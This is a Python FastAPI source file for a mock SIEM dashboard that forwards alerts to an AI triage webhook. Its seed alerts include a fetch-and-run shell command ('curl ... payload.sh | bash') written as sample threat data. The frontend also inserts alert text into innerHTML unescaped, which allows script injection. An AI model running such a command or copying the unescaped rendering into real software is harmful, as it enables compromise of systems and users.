import os
import json
import logging
import requests
from typing import List, Optional
from pydantic import BaseModel
from fastapi import FastAPI, HTTPException

N8N_WEBHOOK_URL = os.environ.get("N8N_WEBHOOK_URL", "")
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("MockSIEM")

app = FastAPI(title="Mock SIEM Console")

# Enable CORS for local dashboards
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

DB_FILE = os.path.join(os.path.dirname(__file__), "database.json")
alerts_db = []

# Load initial database
def load_db():
    global alerts_db
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f:
                alerts_db = json.load(f)
            logger.info(f"Loaded {len(alerts_db)} alerts from database.json")
        else:
            alerts_db = []
            logger.warning("database.json not found, initializing empty database.")
    except Exception as e:
        logger.error(f"Error loading database.json: {str(e)}")
        alerts_db = []

load_db()

class Alert(BaseModel):
    id: str
    title: str
    severity: str
    status: str
    timestamp: str
    indicator: str
    indicator_type: str
    details: str
    resolution_notes: str

class CreateAlertRequest(BaseModel):
    title: str
    severity: str
    status: str = "OPEN"
    timestamp: str
    indicator: str
    indicator_type: str
    details: str
    resolution_notes: str = ""

class ResolveRequest(BaseModel):
    status: str
    resolution_notes: str

@app.post("/api/alerts", response_model=Alert)
def create_alert(payload: CreateAlertRequest):
    """Dynamically insert a new alert into the SIEM database."""
    # Auto-calculate the next ID
    existing_ids = [int(a["id"]) for a in alerts_db if a["id"].isdigit()]
    new_id = str(max(existing_ids) + 1 if existing_ids else 100)
    
    alert = {
        "id": new_id,
        "title": payload.title,
        "severity": payload.severity,
        "status": payload.status.upper(),
        "timestamp": payload.timestamp,
        "indicator": payload.indicator,
        "indicator_type": payload.indicator_type,
        "details": payload.details,
        "resolution_notes": payload.resolution_notes
    }
    
    alerts_db.append(alert)
    
    # Persist database back to disk
    try:
        with open(DB_FILE, "w") as f:
            json.dump(alerts_db, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to persist new alert: {str(e)}")
        
    # Forward to n8n Webhook to trigger autonomous triage
    if N8N_WEBHOOK_URL:
        try:
            logger.info(f"Forwarding alert {new_id} to n8n webhook: {N8N_WEBHOOK_URL}")
            requests.post(N8N_WEBHOOK_URL, json=alert, timeout=2)
        except Exception as e:
            logger.error(f"Failed to forward webhook to n8n: {str(e)}")
            
    return alert

@app.get("/api/alerts", response_model=List[Alert])
def get_alerts(status: Optional[str] = None):
    """Retrieve alerts, optionally filtered by status (OPEN/RESOLVED)."""
    if status:
        return [a for a in alerts_db if a["status"].upper() == status.upper()]
    return alerts_db

@app.get("/api/alerts/{alert_id}", response_model=Alert)
def get_alert_by_id(alert_id: str):
    """Get details for a specific alert."""
    for alert in alerts_db:
        if alert["id"] == alert_id:
            return alert
    raise HTTPException(status_code=404, detail="Alert not found")

@app.post("/api/alerts/{alert_id}/resolve")
def resolve_alert(alert_id: str, payload: ResolveRequest):
    """Resolve/Close an alert with resolution notes."""
    for alert in alerts_db:
        if alert["id"] == alert_id:
            alert["status"] = payload.status.upper()
            alert["resolution_notes"] = payload.resolution_notes
            # Write back to disk to persist
            try:
                with open(DB_FILE, "w") as f:
                    json.dump(alerts_db, f, indent=2)
            except Exception as e:
                logger.error(f"Failed to persist resolved alert: {str(e)}")
            return {"status": "success", "message": f"Alert {alert_id} resolved"}
    raise HTTPException(status_code=404, detail="Alert not found")

@app.post("/api/alerts/seed")
def seed_database():
    """Reset the database to initial seed values."""
    default_alerts = [
        {
            "id": "101",
            "title": "Suspicious URL Click Detected",
            "severity": "MEDIUM",
            "status": "OPEN",
            "timestamp": "2026-07-20T22:20:00Z",
            "indicator": "http://secure-login-bank-update.xyz/login.php",
            "indicator_type": "URL",
            "details": "User john.doe@company.com clicked an inbound link from an external email. Link redirected to a credential harvesting form.",
            "resolution_notes": ""
        },
        {
            "id": "102",
            "title": "Malicious Command Line Execution",
            "severity": "HIGH",
            "status": "OPEN",
            "timestamp": "2026-07-20T22:22:15Z",
            "indicator": "curl http://malicious-site.ru/payload.sh | bash",
            "indicator_type": "Command",
            "details": "Unexpected shell session spawned by user 'app-service'. Detected execution of a bash script retrieved directly from an external host.",
            "resolution_notes": ""
        },
        {
            "id": "103",
            "title": "SSH Brute Force Scans",
            "severity": "MEDIUM",
            "status": "OPEN",
            "timestamp": "2026-07-20T22:25:30Z",
            "indicator": "185.156.74.65",
            "indicator_type": "IP",
            "details": "Detected 45 unsuccessful login attempts targeting account 'admin' on server srv-prod-web-01 over a span of 30 seconds.",
            "resolution_notes": ""
        }
    ]
    global alerts_db
    alerts_db = default_alerts
    try:
        with open(DB_FILE, "w") as f:
            json.dump(alerts_db, f, indent=2)
        logger.info("Database reset to defaults.")
        return {"status": "success", "message": "SIEM Database reset successfully"}
    except Exception as e:
        logger.error(f"Failed to seed database: {str(e)}")
        raise HTTPException(status_code=500, detail="Failed to write seed database")

@app.get("/", response_class=HTMLResponse)
def index():
    """Serve a beautiful, interactive web panel for the Mock SIEM."""
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SIEM Enterprise Console</title>
        <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --bg: #070913;
                --panel: #0d111d;
                --panel-header: #151b2d;
                --border: rgba(255,255,255,0.06);
                --text: #e2e8f0;
                --text-muted: #64748b;
                --primary: #3b82f6;
                --success: #10b981;
                --warning: #f59e0b;
                --danger: #ef4444;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body {
                background: var(--bg);
                color: var(--text);
                font-family: 'Plus Jakarta Sans', sans-serif;
                padding: 2rem;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                display: flex;
                flex-direction: column;
                gap: 1.5rem;
            }
            header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid var(--border);
                padding-bottom: 1rem;
            }
            .logo {
                display: flex;
                align-items: center;
                gap: 0.75rem;
                font-size: 1.25rem;
                font-weight: 700;
                letter-spacing: 0.05em;
                color: var(--primary);
            }
            .logo span { color: #fff; }
            .btn {
                background: var(--primary);
                border: none;
                color: white;
                padding: 0.5rem 1rem;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                display: inline-flex;
                align-items: center;
                gap: 0.5rem;
                font-size: 0.85rem;
                transition: opacity 0.2s;
            }
            .btn:hover { opacity: 0.9; }
            .btn-secondary {
                background: transparent;
                border: 1px solid var(--border);
                color: var(--text-muted);
            }
            .btn-secondary:hover {
                border-color: var(--text-muted);
                color: var(--text);
            }
            .console-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 1.5rem;
            }
            @media (max-width: 768px) {
                .console-grid { grid-template-columns: 1fr; }
            }
            .panel {
                background: var(--panel);
                border: 1px solid var(--border);
                border-radius: 12px;
                overflow: hidden;
            }
            .panel-header {
                background: var(--panel-header);
                padding: 1rem;
                font-weight: 700;
                font-size: 0.9rem;
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid var(--border);
            }
            .alert-list {
                display: flex;
                flex-direction: column;
                max-height: 500px;
                overflow-y: auto;
            }
            .alert-item {
                padding: 1rem;
                border-bottom: 1px solid var(--border);
                cursor: pointer;
                transition: background 0.2s;
            }
            .alert-item:hover {
                background: rgba(255,255,255,0.02);
            }
            .alert-item.active {
                background: rgba(59,130,246,0.05);
                border-left: 3px solid var(--primary);
            }
            .alert-meta {
                display: flex;
                justify-content: space-between;
                font-size: 0.75rem;
                color: var(--text-muted);
                margin-bottom: 0.5rem;
            }
            .badge {
                padding: 0.2rem 0.5rem;
                border-radius: 4px;
                font-size: 0.7rem;
                font-weight: 700;
            }
            .badge.severity-high { background: rgba(239,68,68,0.15); color: var(--danger); }
            .badge.severity-medium { background: rgba(245,158,11,0.15); color: var(--warning); }
            .badge.status-open { background: rgba(59,130,246,0.15); color: var(--primary); }
            .badge.status-resolved { background: rgba(16,185,129,0.15); color: var(--success); }
            
            .alert-title { font-weight: 600; font-size: 0.9rem; margin-bottom: 0.25rem; }
            .alert-indicator { font-family: 'Fira Code', monospace; font-size: 0.75rem; color: var(--primary); }
            
            .alert-details {
                padding: 1.5rem;
                display: flex;
                flex-direction: column;
                gap: 1.5rem;
            }
            .detail-section h4 {
                font-size: 0.8rem;
                text-transform: uppercase;
                color: var(--text-muted);
                margin-bottom: 0.5rem;
                letter-spacing: 0.05em;
            }
            .detail-content {
                background: rgba(0,0,0,0.2);
                border: 1px solid var(--border);
                padding: 1rem;
                border-radius: 6px;
                font-size: 0.85rem;
                line-height: 1.5;
            }
            .detail-content.code {
                font-family: 'Fira Code', monospace;
                color: var(--primary);
            }
            .detail-content.ai-notes {
                border-left: 3px solid var(--success);
                white-space: pre-line;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <header>
                <div class="logo">
                    <i class="fa-solid fa-shield-halved"></i>
                    <span>ENTERPRISE</span>.SIEM
                </div>
                <div style="display: flex; gap: 1rem; align-items: center;">
                    <button class="btn btn-secondary" onclick="seedDatabase()"><i class="fa-solid fa-arrow-rotate-right"></i> Reset Alert Queue</button>
                    <button class="btn" onclick="fetchAlerts()"><i class="fa-solid fa-sync"></i> Refresh</button>
                </div>
            </header>

            <div class="console-grid">
                <!-- Left Panel: Alerts -->
                <div class="panel">
                    <div class="panel-header">
                        <span>Incident Alerts Queue</span>
                        <span id="open-count" style="font-size: 0.75rem; background: var(--primary); padding: 0.2rem 0.5rem; border-radius: 10px;">0 Open</span>
                    </div>
                    <!-- Manual Ingestion Form with Tabs -->
                    <div style="padding: 1rem; border-bottom: 1px solid var(--border); display: flex; flex-direction: column; gap: 0.75rem; background: rgba(255, 255, 255, 0.02);">
                        <div style="display: flex; gap: 1rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 0.5rem; margin-bottom: 0.25rem;">
                            <button id="tab-btn-indicator" class="tab-btn active" onclick="switchFormTab('indicator')" style="background: none; border: none; color: var(--primary); font-size: 0.75rem; font-weight: 700; text-transform: uppercase; cursor: pointer; padding: 0.25rem 0.5rem; outline: none;">Indicator Triage</button>
                            <button id="tab-btn-audit" class="tab-btn" onclick="switchFormTab('audit')" style="background: none; border: none; color: var(--text-muted); font-size: 0.75rem; font-weight: 700; text-transform: uppercase; cursor: pointer; padding: 0.25rem 0.5rem; outline: none;">Ad-hoc Audit</button>
                        </div>

                        <!-- Form Type 1: Indicator Triage -->
                        <div id="form-indicator-group" style="display: flex; flex-direction: column; gap: 0.75rem;">
                            <div style="display: flex; gap: 0.5rem;">
                                <select id="custom-type" style="background: var(--bg-card); color: var(--text); border: 1px solid var(--border); padding: 0.4rem; border-radius: 4px; font-size: 0.8rem; outline: none; cursor: pointer;">
                                    <option value="URL">URL</option>
                                    <option value="IP">IP Address</option>
                                    <option value="Command">Command</option>
                                </select>
                                <input type="text" id="custom-indicator" placeholder="e.g. http://malicious-site.com" style="flex: 1; background: var(--bg-card); color: var(--text); border: 1px solid var(--border); padding: 0.4rem; border-radius: 4px; font-size: 0.8rem; outline: none;">
                            </div>
                            <div style="display: flex; gap: 0.5rem;">
                                <input type="text" id="custom-title" placeholder="Incident Title (optional)" style="flex: 1; background: var(--bg-card); color: var(--text); border: 1px solid var(--border); padding: 0.4rem; border-radius: 4px; font-size: 0.8rem; outline: none;">
                                <button class="btn btn-primary" onclick="submitCustomAlert()" style="padding: 0.4rem 1rem; font-size: 0.8rem; border: none; cursor: pointer;"><i class="fa-solid fa-paper-plane"></i> Submit</button>
                            </div>
                        </div>

                        <!-- Form Type 2: Ad-Hoc Audit -->
                        <div id="form-audit-group" style="display: none; flex-direction: column; gap: 0.75rem;">
                            <div style="display: flex; gap: 0.5rem; align-items: center;">
                                <select id="audit-source" style="background: var(--bg-card); color: var(--text); border: 1px solid var(--border); padding: 0.4rem; border-radius: 4px; font-size: 0.8rem; outline: none; cursor: pointer;">
                                    <option value="Email">Phishing Email</option>
                                    <option value="Log">System / Web Logs</option>
                                </select>
                                <span style="font-size: 0.75rem; color: var(--text-muted);">Paste raw text below to run an AI audit</span>
                            </div>
                            <textarea id="audit-text" placeholder="Paste email body/headers or log contents here..." style="background: var(--bg-card); color: var(--text); border: 1px solid var(--border); padding: 0.5rem; border-radius: 4px; font-size: 0.8rem; outline: none; min-height: 80px; resize: vertical; font-family: monospace;"></textarea>
                            <div style="display: flex; justify-content: flex-end;">
                                <button class="btn btn-primary" onclick="submitAdHocAudit()" style="padding: 0.4rem 1rem; font-size: 0.8rem; border: none; cursor: pointer;"><i class="fa-solid fa-wand-magic-sparkles"></i> Run AI Audit</button>
                            </div>
                        </div>
                    </div>

                    <!-- Dynamic SOC Status Dashboard -->
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.01);">
                        <div style="background: rgba(0, 122, 255, 0.05); border: 1px solid rgba(0, 122, 255, 0.15); padding: 0.5rem; border-radius: 6px; text-align: center;">
                            <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Total</div>
                            <div id="kpi-total" style="font-size: 1.1rem; font-weight: 800; color: var(--primary); margin-top: 0.25rem;">0</div>
                        </div>
                        <div style="background: rgba(255, 149, 0, 0.05); border: 1px solid rgba(255, 149, 0, 0.15); padding: 0.5rem; border-radius: 6px; text-align: center;">
                            <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Open</div>
                            <div id="kpi-open" style="font-size: 1.1rem; font-weight: 800; color: #ff9500; margin-top: 0.25rem;">0</div>
                        </div>
                        <div style="background: rgba(52, 199, 89, 0.05); border: 1px solid rgba(52, 199, 89, 0.15); padding: 0.5rem; border-radius: 6px; text-align: center;">
                            <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700;">Resolved</div>
                            <div id="kpi-resolved" style="font-size: 1.1rem; font-weight: 800; color: #30d158; margin-top: 0.25rem;">0</div>
                        </div>
                    </div>

                    <div class="alert-list" id="alert-list-container">
                        <!-- Populated by JavaScript -->
                    </div>
                </div>

                <!-- Right Panel: Investigation Details -->
                <div class="panel">
                    <div class="panel-header">Investigation Workbench</div>
                    <div id="details-workbench" class="alert-details">
                        <div style="text-align: center; padding: 4rem 0; color: var(--text-muted);">
                            <i class="fa-solid fa-search" style="font-size: 3rem; margin-bottom: 1rem;"></i>
                            <p>Select an alert from the queue to start investigating</p>
                    </div>
                </div>
            </div>

            <!-- Recruiter & Architecture Guide -->
            <div class="panel" style="margin-top: 1rem; padding: 2rem;">
                <h3 style="font-size: 1.1rem; color: var(--primary); margin-bottom: 1.25rem; text-transform: uppercase; letter-spacing: 0.05em; display: flex; align-items: center; gap: 0.5rem;"><i class="fa-solid fa-graduation-cap"></i> Recruiter & Architecture Guide: How NevesSec Works</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; font-size: 0.85rem; line-height: 1.5;">
                    <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid var(--border); padding: 1.25rem; border-radius: 12px; display: flex; flex-direction: column; gap: 0.5rem;">
                        <h4 style="color: #fff; font-size: 0.95rem; display: flex; align-items: center; gap: 0.5rem;"><i class="fa-solid fa-satellite-dish" style="color: var(--warning);"></i> 1. Telemetry Ingestion</h4>
                        <p style="color: var(--text-muted);">
                            <strong>Where do threats come from?</strong> In a corporate environment, real-world honeypots, firewall system logs, and security agents scan for active attacks. When a threat indicator (like a rogue IP scanning SSH ports, or an executive clicking a phishing URL) is flagged, the system logs the incident here in the SIEM queue as <strong>OPEN</strong>.
                        </p>
                    </div>
                    <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid var(--border); padding: 1.25rem; border-radius: 12px; display: flex; flex-direction: column; gap: 0.5rem;">
                        <h4 style="color: #fff; font-size: 0.95rem; display: flex; align-items: center; gap: 0.5rem;"><i class="fa-solid fa-robot" style="color: var(--primary);"></i> 2. Autonomous AI Webhook</h4>
                        <p style="color: var(--text-muted);">
                            <strong>Why does it need automation?</strong> Enterprise security operations teams are overwhelmed by thousands of logs daily. To prevent fatigue, the SIEM triggers a webhook to n8n, invoking a <strong>L2 Gemini AI Agent</strong>. The agent inspects reputational threat scores on VirusTotal, maps techniques to MITRE ATT&CK, and audits shell scripts.
                        </p>
                    </div>
                    <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid var(--border); padding: 1.25rem; border-radius: 12px; display: flex; flex-direction: column; gap: 0.5rem;">
                        <h4 style="color: #fff; font-size: 0.95rem; display: flex; align-items: center; gap: 0.5rem;"><i class="fa-solid fa-shield-halved" style="color: var(--success);"></i> 3. Containment & Resolution</h4>
                        <p style="color: var(--text-muted);">
                            <strong>How does it help a company?</strong> Instead of waiting hours for a human analyst to review, if the AI agent confirms a critical threat, it instantly calls the network firewall to block the attacking IP, containment takes seconds. The AI then updates the SIEM status to <strong>RESOLVED</strong> and saves its technical notes.
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <script>
            let localAlerts = [];
            let activeAlertId = null;

            async function submitCustomAlert() {
                const type = document.getElementById('custom-type').value;
                const indicator = document.getElementById('custom-indicator').value.trim();
                let title = document.getElementById('custom-title').value.trim();
                
                if (!indicator) {
                    alert("Please enter a threat indicator!");
                    return;
                }
                
                if (!title) {
                    title = `Manual Threat Analysis: ${type}`;
                }
                
                const alertPayload = {
                    title: title,
                    severity: "HIGH",
                    timestamp: new Date().toISOString(),
                    indicator: indicator,
                    indicator_type: type,
                    details: `Manually submitted indicator for real-time security assessment and triage.`
                };
                
                try {
                    const response = await fetch('/api/alerts', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(alertPayload)
                    });
                    
                    if (response.ok) {
                        alert("Threat alert submitted successfully! Triggering AI analyst triage...");
                        document.getElementById('custom-indicator').value = '';
                        document.getElementById('custom-title').value = '';
                        fetchAlerts();
                    } else {
                        alert("Error submitting threat: " + await response.text());
                    }
                } catch (e) {
                    alert("Network error: " + e.message);
                }
            }

            function switchFormTab(tab) {
                const indicatorTabBtn = document.getElementById('tab-btn-indicator');
                const auditTabBtn = document.getElementById('tab-btn-audit');
                const indicatorGroup = document.getElementById('form-indicator-group');
                const auditGroup = document.getElementById('form-audit-group');
                
                if (tab === 'indicator') {
                    indicatorTabBtn.style.color = 'var(--primary)';
                    auditTabBtn.style.color = 'var(--text-muted)';
                    indicatorGroup.style.display = 'flex';
                    auditGroup.style.display = 'none';
                } else {
                    indicatorTabBtn.style.color = 'var(--text-muted)';
                    auditTabBtn.style.color = 'var(--primary)';
                    indicatorGroup.style.display = 'none';
                    auditGroup.style.display = 'flex';
                }
            }

            async function submitAdHocAudit() {
                const source = document.getElementById('audit-source').value;
                const text = document.getElementById('audit-text').value.trim();
                
                if (!text) {
                    alert("Please paste some content to analyze!");
                    return;
                }
                
                const title = `Ad-Hoc Audit: ${source === 'Email' ? 'Suspicious Email' : 'Raw Log File'}`;
                
                const alertPayload = {
                    title: title,
                    severity: "HIGH",
                    timestamp: new Date().toISOString(),
                    indicator: source === 'Email' ? 'Raw Email Data' : 'Raw Log Data',
                    indicator_type: source,
                    details: text
                };
                
                try {
                    const response = await fetch('/api/alerts', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(alertPayload)
                    });
                    
                    if (response.ok) {
                        alert("Content submitted successfully! Forwarding to AI agent for audit...");
                        document.getElementById('audit-text').value = '';
                        fetchAlerts();
                    } else {
                        alert("Error submitting audit: " + await response.text());
                    }
                } catch (e) {
                    alert("Network error: " + e.message);
                }
            }

            async function fetchAlerts() {
                try {
                    const response = await fetch('/api/alerts');
                    localAlerts = await response.json();
                    renderAlerts();
                } catch (e) {
                    console.error("Failed to load alerts", e);
                }
            }

            function renderAlerts() {
                const container = document.getElementById('alert-list-container');
                container.innerHTML = '';
                
                const totalCount = localAlerts.length;
                const openCount = localAlerts.filter(a => a.status === 'OPEN').length;
                const resolvedCount = localAlerts.filter(a => a.status === 'RESOLVED').length;
                
                document.getElementById('kpi-total').textContent = totalCount;
                document.getElementById('kpi-open').textContent = openCount;
                document.getElementById('kpi-resolved').textContent = resolvedCount;
                
                document.getElementById('open-count').textContent = `${openCount} Open`;

                // Sort alerts newest to oldest
                const sortedAlerts = [...localAlerts].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

                sortedAlerts.forEach(alert => {
                    const item = document.createElement('div');
                    item.className = `alert-item ${activeAlertId === alert.id ? 'active' : ''}`;
                    item.onclick = () => selectAlert(alert.id);
                    
                    const severityClass = `severity-${alert.severity.toLowerCase()}`;
                    const statusClass = `status-${alert.status.toLowerCase()}`;
                    
                    let formattedTime = "";
                    try {
                        formattedTime = new Date(alert.timestamp).toLocaleTimeString("en-US", {
                            timeZone: "America/New_York",
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit',
                            hour12: false
                        }) + " EST";
                    } catch (e) {
                        formattedTime = alert.timestamp.substring(11, 19) + " UTC";
                    }

                    item.innerHTML = `
                        <div class="alert-meta">
                            <span class="badge ${severityClass}">${alert.severity}</span>
                            <span>${formattedTime}</span>
                        </div>
                        <div class="alert-title">${alert.title}</div>
                        <div class="alert-meta" style="margin: 0.5rem 0 0 0;">
                            <span class="alert-indicator">${alert.indicator}</span>
                            <span class="badge ${statusClass}">${alert.status}</span>
                        </div>
                    `;
                    container.appendChild(item);
                });

                if (activeAlertId) {
                    renderActiveAlert();
                }
            }

            function selectAlert(id) {
                activeAlertId = id;
                renderAlerts();
            }

            function renderActiveAlert() {
                const workbench = document.getElementById('details-workbench');
                const alert = localAlerts.find(a => a.id === activeAlertId);
                if (!alert) return;

                const severityClass = `severity-${alert.severity.toLowerCase()}`;
                const statusClass = `status-${alert.status.toLowerCase()}`;

                let detailsTime = alert.timestamp;
                try {
                    detailsTime = new Date(alert.timestamp).toLocaleString("en-US", {
                        timeZone: "America/New_York",
                        hour12: false
                    }) + " EST";
                } catch(e) {}

                workbench.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 1rem;">
                        <div>
                            <h2 style="font-size: 1.1rem; font-weight: 700; margin-bottom: 0.25rem;">${alert.title}</h2>
                            <div style="font-size: 0.75rem; color: var(--text-muted);">Timestamp: ${detailsTime}</div>
                        </div>
                        <span class="badge ${statusClass}">${alert.status}</span>
                    </div>

                    <div class="detail-section">
                        <h4>Security Context</h4>
                        <div class="detail-content">${alert.details}</div>
                    </div>

                    <div class="detail-section">
                        <h4>Threat Indicator (${alert.indicator_type})</h4>
                        <div class="detail-content code">${alert.indicator}</div>
                    </div>

                    <div class="detail-section">
                        <h4>AI Analyst Resolution Verdict</h4>
                        <div class="detail-content ai-notes">${alert.resolution_notes || 'Pending analysis. Run the AI agent to triage.'}</div>
                    </div>
                `;
            }

            async function seedDatabase() {
                try {
                    const response = await fetch('/api/alerts/seed', { method: 'POST' });
                    const result = await response.json();
                    if (result.status === 'success') {
                        activeAlertId = null;
                        fetchAlerts();
                    }
                } catch(e) {
                    alert("Error resetting database.");
                }
            }

            // Initial Load
            fetchAlerts();
            // Refresh every 5 seconds to catch AI resolutions
            setInterval(fetchAlerts, 5000);
        </script>
    </body>
    </html>
    """
    return html_content
